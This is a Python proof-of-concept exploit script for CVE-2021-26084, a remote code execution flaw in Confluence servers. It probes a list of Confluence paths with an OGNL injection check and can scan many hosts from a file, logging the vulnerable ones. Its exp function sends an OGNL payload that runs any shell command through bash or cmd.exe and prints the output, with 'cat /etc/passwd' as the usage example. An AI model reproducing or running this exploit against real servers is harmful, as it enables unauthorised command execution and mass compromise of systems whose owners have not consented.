#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
"""
@File    :   PoC.py
@Time    :   2021/09/01 14:16:26
@Author  :   _0xf4n9x_
@Version :   1.0
@Contact :   fanq.xu@gmail.com
"""

import random
import requests
import sys
import os
import urllib3
import argparse
from bs4 import BeautifulSoup
urllib3.disable_warnings()

proxy = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}

def usage():
    print("Eg: \n    python3 PoC.py -u http://127.0.0.1")
    print("    python3 PoC.py -u httts://127.0.0.1 -e 'cat /etc/passwd'")
    print("    python3 PoC.py -f urls.txt")


def poc(host):
    paths = ['/pages/createpage-entervariables.action?SpaceKey=x', '/pages/createpage-entervariables.action', '/confluence/pages/createpage-entervariables.action?SpaceKey=x', '/confluence/pages/createpage-entervariables.action', '/wiki/pages/createpage-entervariables.action?SpaceKey=x', '/wiki/pages/createpage-entervariables.action', '/pages/doenterpagevariables.action', '/pages/createpage.action?spaceKey=myproj', '/pages/templates2/viewpagetemplate.action', '/pages/createpage-entervariables.action', '/template/custom/content-editor', '/templates/editor-preload-container', '/users/user-dark-features']
    for path in paths:
        url = host + path
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1",
            "Content-Type": "application/x-www-form-urlencoded"}
        num1 = random.randint(100, 10000)
        num2 = random.randint(100, 10000)
        sum = num1 * num2
        params = {
        "queryString": "aaaa\\u0027+{" + str(num1) + "*" + str(num2) + "}+\\u0027bbb"}
        try:
            res = requests.post(url, headers=headers, data=params,
                                timeout=6, verify=False, proxies=None)
            if str(sum) in res.text:
                print("[+] " + host + path + " is vulnerable!")
                return path
            else:
                continue
        except:
            continue
    print("[-] " + host + " is not vulnerable!")
    return 0

def exp(host, command, path):
    url = host + path
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1",
        "Content-Type": "application/x-www-form-urlencoded"}
    params = {
        "queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022" + command + "\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}

    res = requests.post(url, headers=headers, data=params,
                        timeout=6, verify=False, proxies=None).text
    soup = BeautifulSoup(res, "html5lib")
    # content = soup.find(method="POST").find_all('input')[1]["value"]
    content = soup.find('input', attrs={'name': 'queryString', 'type': 'hidden'})[
        'value']

    print(content.replace('aaaaaaaa[', '').replace('\n]', ''))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="CVE-2021-26084 Remote Code Execution on Confluence Servers")
    parser.add_argument('-u', '--url', type=str,
                        help="vulnerability verification for individual websites")
    parser.add_argument('-e', '--exec', type=str,
                        help="command execution")
    parser.add_argument('-f', '--file', type=str,
                        help="perform vulnerability checks on multiple websites in a file, and the vulnerable websites will be output to the success.txt file")
    args = parser.parse_args()
    if len(sys.argv) == 3:
        if sys.argv[1] in ['-u', '--url']:
            poc(args.url)
        elif sys.argv[1] in ['-f', '--file']:
            if os.path.isfile(args.file) == True:
                with open(args.file) as target:
                    hosts = []
                    hosts = target.read().splitlines()
                    for host in hosts:
                        if poc(host) != 0:
                            with open("success.txt", "a+") as f:
                                f.write(host + "\n")
    elif len(sys.argv) == 5:
        if set([sys.argv[1], sys.argv[3]]) < set(['-u', '--url', '-e', '--exec']):
            path = poc(args.url)
            if path != 0:
                exp(args.url, args.exec, path)
    else:
        parser.print_help()
        usage()
